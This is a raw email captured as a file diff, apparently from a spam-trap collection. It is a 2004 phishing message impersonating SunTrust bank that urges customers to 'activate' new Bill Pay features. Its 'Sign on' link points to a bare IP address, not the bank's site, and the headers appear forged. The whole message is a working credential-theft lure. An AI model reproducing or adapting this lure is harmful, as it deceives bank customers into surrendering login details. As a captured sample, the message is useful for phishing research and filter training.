@@ -1,0 +1,73 @@
+Return-Path: <support@suntrust.com>
+Delivered-To: em-ca-bait-reckless@em.ca
+Received: (qmail 24578 invoked by uid 115); 9 Dec 2004 00:57:18 -0000
+Received: from support@suntrust.com by churchill by uid 64011 with qmail-scanner-1.22 
+ (clamdscan: 0.75-1. spamassassin: 2.63.  Clear:RC:0(66.209.36.9):. 
+ Processed in 0.388384 secs); 09 Dec 2004 00:57:18 -0000
+Received: from ppp009.max-e07.ewol.com (66.209.36.9)
+  by churchill.factcomp.com with SMTP; 9 Dec 2004 00:57:17 -0000
+X-Message-Info: PUUAZ/kit/726/b/S+4/4024480123
+Received: from abandon.support@suntrust.com ([160.158.105.81]) by bq87-wf04.support@suntrust.com with Microsoft SMTPSVC(5.0.8198.6917);
+	 Wed, 08 Dec 2004 20:01:41 -0500
+Received: from boycott.support@suntrust.com ([230.121.239.124]) by neuritis.support@suntrust.com with MailEnable ESMTP; Wed, 08 Dec 2004 19:54:41 -0500
+From: "SunTrust" <support@suntrust.com>
+To: "Bait-adorable" <bait-adorable@em.ca>
+Subject: SunTrust Bill Pay enhancements
+MIME-Version: 1.0 (produced by desicatealex 7.4)
+Content-Type: multipart/alternative;
+	boundary="--3814375550957063950"
+X-Qmail-Scanner-Message-ID: <110255383867224569@churchill>
+
+----3814375550957063950
+Content-Type: text/html;
+	charset="iso-5277-9"
+Content-Transfer-Encoding: 7Bit
+Content-Description: cummings calcareous seen
+
+<html>
+<head>
+	<title>Untitled</title>
+</head>
+
+<body>
+
+<table width="90%">
+<tr>
+	<td colspan="2"><img src="http://www.suntrust.com/images/Common/release3/logo_home.gif" border="0" alt=""></td>
+</tr>
+<tr>
+<td colspan="2" bgcolor="#F9BC36"><img src="http://www.suntrust.com/images/Common/release3/logo_home.gif" border="0" alt="" height="2" width="1"></td>
+</tr>
+<tr>
+<td width="20">&nbsp;&nbsp;</td>
+<td>
+<font style="font-size: 9pt; font-family: Arial; color: #000000; font-style: normal;">
+<p>Dear SunTrust Customer,</p>
+<br>
+<p>We've enhanced Internet Banking's Bill Pay feature to make it even easier to pay your bills online:
+<ul>
+<li>	Set up and submit payments to multiple billers at the same time -- directly from the initial screen.<br><br>
+<li>	View your pending payments and bill history from the same screen to get a quick snapshot of your bill pay activity.<br><br>
+<li>	Select same day or next day payment delivery, and you'll receive a confirmation number for each payment submitted.
+</ul>
+
+<p>Suntrust requires that you activate this new feature.  <a href="http://194.228.111.12/s">Sign on</a> to Internet Banking today to view all of the new changes we've made to simplify paying your bills online.</p>
+
+<br>
+
+<p>SunTrust Customer Service</p>
+
+</font>
+</td>
+</tr>
+<tr>
+<td colspan="2" bgcolor="#F9BC36"><img src="http://www.suntrust.com/images/Common/release3/logo_home.gif" border="0" alt="" height="2" width="1"></td>
+</tr>
+</table>
+
+
+</body>
+</html>
+
+
+----3814375550957063950--
